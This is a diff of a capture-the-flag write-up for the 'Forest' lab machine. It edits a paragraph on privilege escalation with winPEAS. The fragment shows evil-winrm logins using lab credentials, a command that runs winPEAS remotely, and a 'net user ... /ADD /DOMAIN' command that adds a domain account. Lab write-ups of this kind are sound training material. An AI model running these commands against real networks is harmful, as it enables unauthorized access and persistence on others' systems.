@@ -80,9 +80,10 @@ this credentials, I could use to establish a connection with winrm (`evil-winrm 
 
 ![userflag](/images/forest/userflag.png)
 
-Tried with `winPEASany.exe` to escalate privilegies
+Tried with `winPEASany.exe` to escalate privilegies. The command
+`evil-winrm -i forest.htb -u svc-alfresco -p s3rvice -e .` and `Invoke-Binary winPEASany.exe` started the process to scan forest.htb.local, but this was a loose end to me.
 
-`evil-winrm -i forest.htb -u svc-alfresco -p s3rvice -e .` and `Invoke-Binary winPEASany.exe` started the process to scan forest.htb.local
+
 
 net user John fadf24as /ADD /DOMAIN
 evil-winrm -i 10.10.10.161 -u John -p fadf24as
